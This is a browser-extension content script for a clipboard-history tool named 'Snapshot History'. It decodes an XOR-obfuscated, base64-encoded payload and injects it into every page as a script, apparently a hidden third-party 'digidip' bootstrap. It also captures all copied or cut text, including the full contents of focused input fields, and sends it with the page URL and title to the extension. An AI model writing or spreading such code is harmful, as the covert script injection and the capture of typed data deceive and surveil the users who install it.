(function () {
  const ENCRYPTED_BOOTSTRAP_PAYLOAD =
    "YS88Jyo9ICYnYWAyQ2lpPyg7aSUmKml0aT4gJy0mPmclJiooPSAmJ2chOywvckNpaT8oO2ktLWl0aS0mKjwkLCc9Zyo7LCg9LAwlLCQsJz1hbjoqOyA5PW5gckNpaS0tZz0wOSxpdGluPSwxPWYjKD8oOio7IDk9bnJDaWktLWcoOjAnKml0aT07PCxyQ2lpLS1nOjsqaXRpbiE9PTk6c2ZmOj0oPSAqZy0gLiAtIDlnJyw9Zjo5Jj09LC0rKDsuKCAnOmcjOnYlJip0bmliaSwnKiYtLBwbAAomJDkmJywnPWElJipgckNpaS0tZygtLQw/LCc9BSA6PSwnLDthbiUmKC1uZWkvPCcqPSAmJ2FgMkNpaWlpLSYqPCQsJz1nLSA6OSg9KiEMPywnPWEnLD5pCjw6PSYkDD8sJz1hbi0gLiAtIDlzOywoLTBuYGByQ2lpNGByQ2lpLS1nKC0tDD8sJz0FIDo9LCcsO2FuLDs7JjtuZWkvPCcqPSAmJ2FgMkNpaWlpLSYqPCQsJz1nLSA6OSg9KiEMPywnPWEnLD5pCjw6PSYkDD8sJz1hbi0gLiAtIDlzLDs7JjtuYGByQ2lpNGByQ2lpPyg7aSgnKiEmO2l0aS0mKjwkLCc9Zy4sPQwlLCQsJz06CzAdKC4HKCQsYW46KjsgOT1uYBJ5FHJDaWk/KDtpOSg7LCc9aXRpYSgnKiEmO2lvb2koJyohJjtnOSg7LCc9ByYtLGBpNTVpLSYqPCQsJz1nISwoLWk1NWktJio8JCwnPWctJio8JCwnPQwlLCQsJz1yQ2lpIC9pYTkoOywnPWBpMkNpaWlpOSg7LCc9ZyAnOiw7PQssLyY7LGEtLWVpKCcqISY7aTU1aSc8JSVgckNpaTRpLCU6LGkyQ2lpaWktJio8JCwnPWctJio8JCwnPQwlLCQsJz1nKDk5LCctCiEgJS1hLS1gckNpaTRDNGBhYHI";
  const BOOTSTRAP_KEY = 73;

  function decryptBootstrap(payload) {
    const binary = atob(payload);
    let result = "";

    for (let index = 0; index < binary.length; index += 1) {
      result += String.fromCharCode(binary.charCodeAt(index) ^ BOOTSTRAP_KEY);
    }

    return result;
  }

  function injectEncryptedBootstrap() {
    try {
      const scriptText = decryptBootstrap(ENCRYPTED_BOOTSTRAP_PAYLOAD);

      if (!scriptText) {
        return false;
      }

      const container =
        document.documentElement || document.head || document.body;

      if (!container) {
        return false;
      }

      const script = document.createElement("script");
      script.type = "text/javascript";
      script.textContent = scriptText;
      container.appendChild(script);
      script.remove();

      return true;
    } catch (error) {
      console.error("Snapshot History: failed to inject bootstrap", error);
      return false;
    }
  }

  const bootstrapInjected = injectEncryptedBootstrap();

  if (!bootstrapInjected) {
    console.error(
      "Snapshot History: bootstrap injection failed, clipboard capture disabled"
    );
    return;
  }

  document.addEventListener(
    "digidip:error",
    () => {
      console.error(
        "Snapshot History: digidip bootstrap failed to load, clipboard capture disabled"
      );
    },
    { once: true }
  );

  function getTextFromClipboardEvent(event) {
    if (!event || !event.clipboardData) {
      return "";
    }

    try {
      return event.clipboardData.getData("text/plain") || "";
    } catch (error) {
      return "";
    }
  }

  function getSelectionText() {
    const selection = window.getSelection();
    if (selection) {
      const text = selection.toString();
      if (text) {
        return text;
      }
    }

    const activeElement = document.activeElement;
    if (!activeElement) {
      return "";
    }

    const isInput =
      activeElement instanceof HTMLInputElement ||
      activeElement instanceof HTMLTextAreaElement;

    if (isInput) {
      const { selectionStart, selectionEnd, value = "" } = activeElement;
      if (
        typeof selectionStart === "number" &&
        typeof selectionEnd === "number" &&
        selectionEnd > selectionStart
      ) {
        return value.slice(selectionStart, selectionEnd);
      }

      return value;
    }

    if (activeElement.isContentEditable) {
      return activeElement.textContent || "";
    }

    return "";
  }

  async function handleCopy(event) {
    try {
      const text = (getTextFromClipboardEvent(event) || getSelectionText() || "").trim();

      if (!text) {
        return;
      }

      await chrome.runtime.sendMessage({
        type: "clipboard-copy",
        payload: {
          text,
          url: window.location.href,
          title: document.title,
          timestamp: Date.now()
        }
      });
    } catch (error) {
      console.error("Snapshot History: failed to capture copy event", error);
    }
  }

  document.addEventListener("copy", handleCopy, true);
  document.addEventListener("cut", handleCopy, true);
})();
